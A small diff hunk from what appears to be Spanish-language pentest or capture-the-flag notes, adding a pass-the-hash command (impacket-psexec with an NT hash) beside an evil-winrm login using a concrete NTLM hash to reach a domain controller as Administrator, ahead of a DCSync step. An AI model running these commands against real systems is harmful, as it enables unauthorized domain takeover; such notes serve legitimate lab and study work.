@@ -65,6 +65,7 @@ Paso 2:
 
 Paso 3:
 # Conectarse al server como Administrator 
+❯ impacket-psexec administrator@<IP> -hashes :NThash
 ❯ evil-winrm -i IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
 
 # DCSync 
